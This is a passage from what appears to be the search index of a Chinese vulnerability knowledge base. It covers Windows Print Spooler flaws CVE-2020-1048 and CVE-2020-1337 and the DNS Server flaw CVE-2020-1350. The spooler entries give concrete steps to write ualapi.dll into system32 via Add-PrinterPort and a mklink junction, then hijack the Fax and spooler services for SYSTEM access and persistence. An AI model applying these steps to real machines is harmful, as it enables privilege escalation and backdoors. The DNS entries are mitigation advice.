\u5728\u9009\u62e9\u5176\u4ed6\u5f62\u5f0f\u7684\u8f93\u51fa\u4f1a\u5b8c\u5168\u8df3\u8fc7\u6b64\u68c0\u67e5","title":"\u4e86\u89e3\u9700\u8981\u5229\u7528\u6f0f\u6d1e\u524d\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1048%20Microsoft%20Windows%20Print%20Spooler%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#client-side-port-check-vulnerability-cve-2020-1048","text":"\u53ea\u9700\u8981\u4e00\u4e2aPowerShell\u547d\u4ee4 PowerShell\u4f7f\u7528add-printer\u547d\u4ee4\u5728\u5e95\u5c42\u5219\u662f\u76f4\u63a5\u8c03\u7528XcvData\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u5c06port name\u8bbe\u7f6e\u4e3a\u4efb\u610f\u6587\u4ef6\u800c\u4e0d\u88ab\u68c0\u67e5 \u5c31\u662f\u8fd9\u4e48\u7b80\u5355\u3002UI\u5bf9\u8bdd\u6846\u5177\u6709\u68c0\u67e5\u529f\u80fd\uff0c\u800cPowerShell\u7684WMI\u6253\u5370\u63d0\u4f9b\u7a0b\u5e8f\u6a21\u5757\u5219\u6ca1\u6709\u3002 \u53ea\u9700Add-PrinterPort -Name c:\\windows\\system32\\ualapi.dll\u5728PowerShell\u7a97\u53e3\u4e2d\u6267\u884c\u5373\u53ef","title":"Client Side Port Check Vulnerability (CVE-2020-1048)"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1337/","text":"CVE-2020-1337 \u00b6 \u7ecf\u8fc7\u8865\u4e01\u540e\uff0c\u7d27\u968fCVE-2020-1048\u5176\u540e\u7684CVE-2020-1337\u53c8\u6709\u59ff\u52bf\u53ef\u4ee5\u7ed5\u68c0\u67e5 \u4ecegithub\u4e0a\u83b7\u53d6\u6837\u672c\u5206\u6790 https://github.com/math1as/cve-2020-1337-exploit powershell -ep bypass ``-F` `C:\\CVE-2020-1337-exploit-master\\exploit.ps1 \u5728\u67e5\u770b\u4e86\u516c\u5e03\u7684\u811a\u672c\u6587\u4ef6\u53ef\u4ee5\u53d1\u73b0 \u5b83\u7684\u547d\u4ee4\u4e5f\u662f\u975e\u5e38\u7684\u7b80\u5355\uff0c\u5728\u6267\u884c\u4e0a\u8ff0\u8fc7\u7a0b\u4e2d\u6dfb\u52a0\u4e86\u4e00\u6761\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u7cfb\u7edf\u76ee\u5f55\u8f6f\u8054\u63a5 cmd /c mklink /J c:\\users\\test\\mytarg5 C:\\Windows\\system32 \u65e0\u8bba\u662fAddPort\u8fd8\u662f\u4fee\u590d\u540e\u7684XcvData\u51fd\u6570\u8fdb\u884c\u68c0\u67e5\u65f6\uff0c\u90fd\u662f\u5224\u65ad\u5f53\u524d\u7528\u6237\u662f\u5426\u5177\u6709\u5bf9\u76ee\u6807\u8def\u5f84\u7684\u8bbf\u95ee\u6743\u9650\u7684\u3002 \u5c06port name\u6307\u5411 c:\\users\\test\\myfolder\\xxx.dll \uff0c\u901a\u8fc7\u68c0\u67e5\u540e\uff0c\u518d\u5c06mytarg5\u4f5c\u4e3a\u4e00\u4e2a\u8f6f\u94fe\u63a5\u91cd\u5b9a\u5411\u5230\u76ee\u6807\u7684\u7cfb\u7edf\u8def\u5f84\u4e2d\uff0c\u5373\u53ef\u5b8c\u6210\u5bf9\u8865\u4e01\u7684\u7ed5\u8fc7\u3002 \u521b\u5efa\u4e00\u4e2a\u8f6f\u8fde\u63a5\uff0c\u5c06\u6587\u4ef6\u6253\u5370\u4f4d\u7f6e\u6539\u4e3a c:\\users\\test\\mytarg5\uff0c\u4fbf\u4f1a\u5728C:\\Windows\\system32\u4e0b\u6210\u529f\u521b\u5efaualapi.dll \u4e3a\u4ec0\u4e48\u662fualapi.dll \u00b6 \u9996\u5148\u80fd\u591f\u5c06\u8fd9\u4f4d\u7f6e\u91ca\u653e\u6587\u4ef6\u6240\u4ee5\u6211\u4eec\u5c31\u8981\u60f3\u5c3d\u529e\u6cd5\u5229\u7528\u4e0a\uff0c\u663e\u7136\u5bb9\u6613\u53d7\u5230dll\u52ab\u6301\u5c1d\u8bd5\u653b\u51fb\u7684\u670d\u52a1\u7b2c\u4e00\u4e2a\u7a81\u7834\u53e3\uff0c \u8fd0\u884cProcess Monitor\uff0c\u542f\u52a8\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5c1d\u8bd5\uff0c\u4e0d\u8fc7\u6211\u4eec\u8981\u5728\u505a\u7684\u65f6\u5019\u9700\u8981\u4e00\u4e9b\u9650\u5236\uff0c\u6211\u4eec\u73b0\u5728\u60f3\u63d0\u9ad8\u7279\u6743\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5c1a\u672a\u542f\u52a8\u7684\u670d\u52a1\u6216\u8005\u5bfb\u627e\u4e00\u4e2a\u53ef\u4ee5\u88ab\u6807\u51c6\u7528\u6237\u505c\u6b62\u7684\u670d\u52a1\u3002 \u542f\u52a8\u670d\u52a1\u901a\u5e38\u9700\u8981\u7ba1\u7406\u6743\u9650\uff0c\u8fd9\u4e0d\u662f\u6211\u4eec\u60f3\u8981\u7684\uff0c\u901a\u8fc7accesschk\u5de5\u5177\u6211\u4eec\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u83b7\u53d6\u6240\u6709\u670d\u52a1\u7684\u6743\u9650\u3002 accesschk.exe -c * -L > servsddl.txt servsddl.txt\u4e2d\u4f1a\u8bb0\u5f55\u6240\u6709\u670d\u52a1\u8f93\u51fa \u5728FAX\u670d\u52a1\u4e2d\u6211\u4eec\u53d1\u73b0\u4e86 ``[0] ACCESS_ALLOWED_ACE_TYPE: Everyone`` ``SERVICE_QUERY_STATUS`` ``SERVICE_START \u670d\u52a1\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5b83 \u73b0\u5728\u8ba9\u6211\u4eec\u542f\u52a8FAX\u670d\u52a1\uff0c\u5e76\u901a\u8fc7ProcessMonitor\u76d1\u63a7\u4ed6 \u5728\u542f\u52a8\u6253\u5370\u8fd9\u4e2a\u670d\u52a1\u65f6\uff0c\u4ed6\u4f1a\u5c1d\u8bd5\u5bfb\u627eualapi.dll \u6240\u4ee5\u6211\u95e8\u5c06\u8fd9\u4e2adll\u653e\u7f6e\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u7136\u540e\u60ca\u559c\u7684\u53d1\u73b0\uff0c\u542f\u52a8spoolsv\u65f6\u4f1a\u53d1\u73b0\u4e5f\u4f1a\u5bfb\u627e\u8fd9\u4e2adll \u7ecf\u8fc7\u5bf9\u6bd4\u4ed6\u4eec\u90fd\u6709\u76f8\u540c\u7684\u5bfb\u627eualapi.dll\u7684\u4ee3\u7801\uff0c\u5728\u4e0b\u9762\u7684IDA\u4e2d\u53ef\u4ee5\u770b\u5230 \uff0c\u8be5\u670d\u52a1\u4f7f\u7528GetProcAddress\u67e5\u627eualapi.dll\u4e00\u4e9b\u5bfc\u51fa \u65e2\u7136\u80fd\u591f\u52a0\u8f7d\u6211\u4eec\u5148\u524d\u91ca\u653e\u7684\u52a8\u6001\u5e93\uff0cdllmain\u4e2d\u5c31\u53ef\u4ee5\u6267\u884c\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u4ecegithub\u4e0a\u62ff\u5230\u7684\u793a\u4f8b\u8fd0\u884c\uff08\u8fd0\u884c\u5728windows10\u7cfb\u7edf\u4e0a\uff09\uff0c\u4ed6\u91ca\u653e\u4e86\u4e00\u4e2aPE\u5728system32\u4e0b\uff0c\u4ee3\u7801\u4e5f\u975e\u5e38\u7b80\u5355\u7684\u8fd0\u884cwhoami\u67e5\u770b\u6743\u9650\u3002 \u6267\u884c\u540e\u6743\u9650\u662fsystem\uff0c\u8fd9\u5c31\u4ee3\u8868\u4f60\u80fd\u505a\u5f88\u591a\u4e8b\u60c5\u3002 \u6b63\u5f53\u6211\u60f3\u7740\u5982\u4f55\u5229\u7528dll\u88ab\u52a0\u8f7d\u8d77\u6765\u540e\uff0c\u60ca\u559c\u7684\u5728\u540e\u9762\u7684\u4ee3\u7801\u4e2d\u53d1\u73b0\uff0c\u5728spoolsv.exe\u4e2d\u4e5f\u6709\u8c03\u7528\u5bfc\u51fa\u51fd\u6570\uff0c\u8fd9\u53ea\u9700\u8981\u6211\u4eec\u7a0d\u5fae\u6784\u9020\u4e00\u4e0b\uff0c\u5c31\u80fd\u5236\u9020\u4e00\u4e2a\u6c38\u4e45\u540e\u95e8\uff0c\u5373\u4f7f\u8865\u4e01\u4fee\u6b63\u540e\u5b83\u4f9d\u7136\u5b58\u5728\u3002 \u5982\u4f55\u907f\u514d \u00b6 \u5982\u679c\u4f60\u4e0d\u5e78\u88ab\u8be5\u6f0f\u6d1e\u5229\u7528\u4e86\uff0c\u7531\u4e8e\u5373\u4f7f\u8865\u4e01\u4fee\u6b63\u540e\u5b83\u4f9d\u7136\u5b58\u5728\uff0c\u6240\u4ee5\u4f60\u9700\u8981\u5728PowerShell\u4e2d\u626b\u63cf\u6240\u6709\u57fa\u4e8e\u6587\u4ef6\u7684\u7aef\u53e3\uff0c\u67e5\u770bHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Ports\u5176\u4e2d\u5305\u542b\u6587\u4ef6\u8def\u5f84\u7684\u4efb\u4f55\u7aef\u53e3\uff0c\u5c24\u5176\u662f\u4ee5.DLL\u6216\u6269\u5c55\u540d\u7ed3\u5c3e\u7684\u7aef\u53e3\u3002 \u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u5bb9\u6613\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u4f60\u5b8c\u5168\u53ef\u4ee5\u5c06\u4e00\u4efd\u540e\u95e8\u4ee3\u7801\u6784\u9020\u51fa\u73b0\u5728spoolsv.exe\u7684\u8c03\u7528\u4e2d\u3002 \u53c2\u8003\u6587\u732e \u00b6 https://github.com/math1as/cve-2020-1337-exploit https://github.com/ionescu007/faxhell https://mp.weixin.qq.com/s/LLzIlKrrfpJuk6CGBRZMvw https://windows-internals.com/faxing-your-way-to-system/ https://windows-internals.com/printdemon-cve-2020-1048/","title":"CVE 2020 1337"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1337/#cve-2020-1337","text":"\u7ecf\u8fc7\u8865\u4e01\u540e\uff0c\u7d27\u968fCVE-2020-1048\u5176\u540e\u7684CVE-2020-1337\u53c8\u6709\u59ff\u52bf\u53ef\u4ee5\u7ed5\u68c0\u67e5 \u4ecegithub\u4e0a\u83b7\u53d6\u6837\u672c\u5206\u6790 https://github.com/math1as/cve-2020-1337-exploit powershell -ep bypass ``-F` `C:\\CVE-2020-1337-exploit-master\\exploit.ps1 \u5728\u67e5\u770b\u4e86\u516c\u5e03\u7684\u811a\u672c\u6587\u4ef6\u53ef\u4ee5\u53d1\u73b0 \u5b83\u7684\u547d\u4ee4\u4e5f\u662f\u975e\u5e38\u7684\u7b80\u5355\uff0c\u5728\u6267\u884c\u4e0a\u8ff0\u8fc7\u7a0b\u4e2d\u6dfb\u52a0\u4e86\u4e00\u6761\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u7cfb\u7edf\u76ee\u5f55\u8f6f\u8054\u63a5 cmd /c mklink /J c:\\users\\test\\mytarg5 C:\\Windows\\system32 \u65e0\u8bba\u662fAddPort\u8fd8\u662f\u4fee\u590d\u540e\u7684XcvData\u51fd\u6570\u8fdb\u884c\u68c0\u67e5\u65f6\uff0c\u90fd\u662f\u5224\u65ad\u5f53\u524d\u7528\u6237\u662f\u5426\u5177\u6709\u5bf9\u76ee\u6807\u8def\u5f84\u7684\u8bbf\u95ee\u6743\u9650\u7684\u3002 \u5c06port name\u6307\u5411 c:\\users\\test\\myfolder\\xxx.dll \uff0c\u901a\u8fc7\u68c0\u67e5\u540e\uff0c\u518d\u5c06mytarg5\u4f5c\u4e3a\u4e00\u4e2a\u8f6f\u94fe\u63a5\u91cd\u5b9a\u5411\u5230\u76ee\u6807\u7684\u7cfb\u7edf\u8def\u5f84\u4e2d\uff0c\u5373\u53ef\u5b8c\u6210\u5bf9\u8865\u4e01\u7684\u7ed5\u8fc7\u3002 \u521b\u5efa\u4e00\u4e2a\u8f6f\u8fde\u63a5\uff0c\u5c06\u6587\u4ef6\u6253\u5370\u4f4d\u7f6e\u6539\u4e3a c:\\users\\test\\mytarg5\uff0c\u4fbf\u4f1a\u5728C:\\Windows\\system32\u4e0b\u6210\u529f\u521b\u5efaualapi.dll","title":"CVE-2020-1337"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1337/#ualapidll","text":"\u9996\u5148\u80fd\u591f\u5c06\u8fd9\u4f4d\u7f6e\u91ca\u653e\u6587\u4ef6\u6240\u4ee5\u6211\u4eec\u5c31\u8981\u60f3\u5c3d\u529e\u6cd5\u5229\u7528\u4e0a\uff0c\u663e\u7136\u5bb9\u6613\u53d7\u5230dll\u52ab\u6301\u5c1d\u8bd5\u653b\u51fb\u7684\u670d\u52a1\u7b2c\u4e00\u4e2a\u7a81\u7834\u53e3\uff0c \u8fd0\u884cProcess Monitor\uff0c\u542f\u52a8\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5c1d\u8bd5\uff0c\u4e0d\u8fc7\u6211\u4eec\u8981\u5728\u505a\u7684\u65f6\u5019\u9700\u8981\u4e00\u4e9b\u9650\u5236\uff0c\u6211\u4eec\u73b0\u5728\u60f3\u63d0\u9ad8\u7279\u6743\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5c1a\u672a\u542f\u52a8\u7684\u670d\u52a1\u6216\u8005\u5bfb\u627e\u4e00\u4e2a\u53ef\u4ee5\u88ab\u6807\u51c6\u7528\u6237\u505c\u6b62\u7684\u670d\u52a1\u3002 \u542f\u52a8\u670d\u52a1\u901a\u5e38\u9700\u8981\u7ba1\u7406\u6743\u9650\uff0c\u8fd9\u4e0d\u662f\u6211\u4eec\u60f3\u8981\u7684\uff0c\u901a\u8fc7accesschk\u5de5\u5177\u6211\u4eec\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u83b7\u53d6\u6240\u6709\u670d\u52a1\u7684\u6743\u9650\u3002 accesschk.exe -c * -L > servsddl.txt servsddl.txt\u4e2d\u4f1a\u8bb0\u5f55\u6240\u6709\u670d\u52a1\u8f93\u51fa \u5728FAX\u670d\u52a1\u4e2d\u6211\u4eec\u53d1\u73b0\u4e86 ``[0] ACCESS_ALLOWED_ACE_TYPE: Everyone`` ``SERVICE_QUERY_STATUS`` ``SERVICE_START \u670d\u52a1\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5b83 \u73b0\u5728\u8ba9\u6211\u4eec\u542f\u52a8FAX\u670d\u52a1\uff0c\u5e76\u901a\u8fc7ProcessMonitor\u76d1\u63a7\u4ed6 \u5728\u542f\u52a8\u6253\u5370\u8fd9\u4e2a\u670d\u52a1\u65f6\uff0c\u4ed6\u4f1a\u5c1d\u8bd5\u5bfb\u627eualapi.dll \u6240\u4ee5\u6211\u95e8\u5c06\u8fd9\u4e2adll\u653e\u7f6e\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u7136\u540e\u60ca\u559c\u7684\u53d1\u73b0\uff0c\u542f\u52a8spoolsv\u65f6\u4f1a\u53d1\u73b0\u4e5f\u4f1a\u5bfb\u627e\u8fd9\u4e2adll \u7ecf\u8fc7\u5bf9\u6bd4\u4ed6\u4eec\u90fd\u6709\u76f8\u540c\u7684\u5bfb\u627eualapi.dll\u7684\u4ee3\u7801\uff0c\u5728\u4e0b\u9762\u7684IDA\u4e2d\u53ef\u4ee5\u770b\u5230 \uff0c\u8be5\u670d\u52a1\u4f7f\u7528GetProcAddress\u67e5\u627eualapi.dll\u4e00\u4e9b\u5bfc\u51fa \u65e2\u7136\u80fd\u591f\u52a0\u8f7d\u6211\u4eec\u5148\u524d\u91ca\u653e\u7684\u52a8\u6001\u5e93\uff0cdllmain\u4e2d\u5c31\u53ef\u4ee5\u6267\u884c\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u4ecegithub\u4e0a\u62ff\u5230\u7684\u793a\u4f8b\u8fd0\u884c\uff08\u8fd0\u884c\u5728windows10\u7cfb\u7edf\u4e0a\uff09\uff0c\u4ed6\u91ca\u653e\u4e86\u4e00\u4e2aPE\u5728system32\u4e0b\uff0c\u4ee3\u7801\u4e5f\u975e\u5e38\u7b80\u5355\u7684\u8fd0\u884cwhoami\u67e5\u770b\u6743\u9650\u3002 \u6267\u884c\u540e\u6743\u9650\u662fsystem\uff0c\u8fd9\u5c31\u4ee3\u8868\u4f60\u80fd\u505a\u5f88\u591a\u4e8b\u60c5\u3002 \u6b63\u5f53\u6211\u60f3\u7740\u5982\u4f55\u5229\u7528dll\u88ab\u52a0\u8f7d\u8d77\u6765\u540e\uff0c\u60ca\u559c\u7684\u5728\u540e\u9762\u7684\u4ee3\u7801\u4e2d\u53d1\u73b0\uff0c\u5728spoolsv.exe\u4e2d\u4e5f\u6709\u8c03\u7528\u5bfc\u51fa\u51fd\u6570\uff0c\u8fd9\u53ea\u9700\u8981\u6211\u4eec\u7a0d\u5fae\u6784\u9020\u4e00\u4e0b\uff0c\u5c31\u80fd\u5236\u9020\u4e00\u4e2a\u6c38\u4e45\u540e\u95e8\uff0c\u5373\u4f7f\u8865\u4e01\u4fee\u6b63\u540e\u5b83\u4f9d\u7136\u5b58\u5728\u3002","title":"\u4e3a\u4ec0\u4e48\u662fualapi.dll"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1337/#_1","text":"\u5982\u679c\u4f60\u4e0d\u5e78\u88ab\u8be5\u6f0f\u6d1e\u5229\u7528\u4e86\uff0c\u7531\u4e8e\u5373\u4f7f\u8865\u4e01\u4fee\u6b63\u540e\u5b83\u4f9d\u7136\u5b58\u5728\uff0c\u6240\u4ee5\u4f60\u9700\u8981\u5728PowerShell\u4e2d\u626b\u63cf\u6240\u6709\u57fa\u4e8e\u6587\u4ef6\u7684\u7aef\u53e3\uff0c\u67e5\u770bHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Ports\u5176\u4e2d\u5305\u542b\u6587\u4ef6\u8def\u5f84\u7684\u4efb\u4f55\u7aef\u53e3\uff0c\u5c24\u5176\u662f\u4ee5.DLL\u6216\u6269\u5c55\u540d\u7ed3\u5c3e\u7684\u7aef\u53e3\u3002 \u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u5bb9\u6613\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u4f60\u5b8c\u5168\u53ef\u4ee5\u5c06\u4e00\u4efd\u540e\u95e8\u4ee3\u7801\u6784\u9020\u51fa\u73b0\u5728spoolsv.exe\u7684\u8c03\u7528\u4e2d\u3002","title":"\u5982\u4f55\u907f\u514d"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1337/#_2","text":"https://github.com/math1as/cve-2020-1337-exploit https://github.com/ionescu007/faxhell https://mp.weixin.qq.com/s/LLzIlKrrfpJuk6CGBRZMvw https://windows-internals.com/faxing-your-way-to-system/ https://windows-internals.com/printdemon-cve-2020-1048/","title":"\u53c2\u8003\u6587\u732e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u5fae\u8f6f\u5b98\u65b9 \u53d1\u5e03\u4e86 Windows DNS Server \u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-1350\uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a\u4e25\u91cd\u3002 Windows DNS Server\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u5411\u53d7\u5f71\u54cd\u670d\u52a1\u5668\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u5f71\u54cd \u5f71\u54cd\u8303\u56f4 \u00b6 Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core inastallation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server version 1909 (Server Core installation) Windows Server version 1903 (Server Core installation) Windows Server version 2004 (Server Core installation) \u4fee\u590d\u5efa\u8bae \u00b6 \u5fae\u8f6f\u63d0\u4f9b\u4e86\u4e34\u65f6\u7684\u7f13\u89e3\u63aa\u65bd\uff1a \u4fee\u6539\u6ce8\u518c\u8868 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters \u503c\uff1aTcpReceivePacketSize \u6570\u636e\u7c7b\u578b DWORD = 0xFF00 \u6ce8\u610f\uff1a\u5fc5\u987b\u91cd\u65b0\u542f\u52a8 DNS \u670d\u52a1\u624d\u80fd\u751f\u6548\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 KB4569509\uff1aDNS \u670d\u52a1\u5668\u6f0f\u6d1e CVE-2020-1350 \u6307\u5357 https://support.microsoft.com/zh-cn/help/4569509/windows-dns-server-remote-code-execution-vulnerability \u82e5\u8981\u79fb\u9664\u6b64\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a \u00b6 \u5e94\u7528\u4fee\u8865\u7a0b\u5e8f\u540e\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u79fb\u9664\u503c TcpReceivePacketSize \u53ca\u5176\u6570\u636e\uff0c\u4ee5\u4f7f\u6ce8\u518c\u8868\u9879 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters \u4e0b\u7684\u6240\u6709\u5176\u4ed6\u5185\u5bb9\u4e0e\u4e4b\u524d\u4fdd\u6301\u76f8\u540c\u3002 \u624b\u52a8\u5347\u7ea7\u65b9\u6848\uff1a \u00b6 \u901a\u8fc7\u5982\u4e0b\u94fe\u63a5\u81ea\u884c\u5bfb\u627e\u7b26\u5408\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u7684\u6f0f\u6d1e\u8865\u4e01\uff0c\u5e76\u8fdb\u884c\u8865\u4e01\u4e0b\u8f7d\u5b89\u88c5\u3002 CVE-2020-1350 | Windows DNS \u670d\u52a1\u5668\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1350 POC \u00b6 CVE-2020-1350-master \u6765\u6e90 \u00b6 https://www.cnvd.org.cn/flaw/show/CNVD-2020-51784","title":"CVE-2020-1350 Windows DNS Server\u8815\u866b\u7ea7\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"\u5fae\u8f6f\u5b98\u65b9 \u53d1\u5e03\u4e86 Windows DNS Server \u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-1350\uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a\u4e25\u91cd\u3002 Windows DNS Server\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u5411\u53d7\u5f71\u54cd\u670d\u52a1\u5668\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u5f71\u54cd","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core inastallation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server version 1909 (Server Core installation) Windows Server version 1903 (Server Core installation) Windows Server version 2004 (Server Core installation)","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","text":"\u5fae\u8f6f\u63d0\u4f9b\u4e86\u4e34\u65f6\u7684\u7f13\u89e3\u63aa\u65bd\uff1a \u4fee\u6539\u6ce8\u518c\u8868 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters \u503c\uff1aTcpReceivePacketSize \u6570\u636e\u7c7b\u578b DWORD = 0xFF00 \u6ce8\u610f\uff1a\u5fc5\u987b\u91cd\u65b0\u542f\u52a8 DNS \u670d\u52a1\u624d\u80fd\u751f\u6548\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 KB4569509\uff1aDNS \u670d\u52a1\u5668\u6f0f\u6d1e CVE-2020-1350 \u6307\u5357 https://support.microsoft.com/zh-cn/help/4569509/windows-dns-server-remote-code-execution-vulnerability","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","text":"\u5e94\u7528\u4fee\u8865\u7a0b\u5e8f\u540e\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u79fb\u9664\u503c TcpReceivePacketSize \u53ca\u5176\u6570\u636e\uff0c\u4ee5\u4f7f\u6ce8\u518c\u8868\u9879 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters \u4e0b\u7684\u6240\u6709\u5176\u4ed6\u5185\u5bb9\u4e0e\u4e4b\u524d\u4fdd\u6301\u76f8\u540c\u3002","title":"\u82e5\u8981\u79fb\u9664\u6b64\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Windows%20DNS%20Server/CVE-2020-1350%20Windows%20DNS%20Server%E8%A0%95%E8%99%AB%E7%BA%A7%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","text":"\u901a\u8fc7\u5982\u4e0b\u94fe\u63a5\u81ea\u884c\u5bfb\u627e\u7b26\u5408\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u7684\u6f0f\u6d1e\u8865\u4e01\uff0c\u5e76\u8fdb\u884c\u8865\u4e01\u4e0b\u8f7d\u5b89\u88c5\u3002 CVE-2020-1350 | Windows DNS 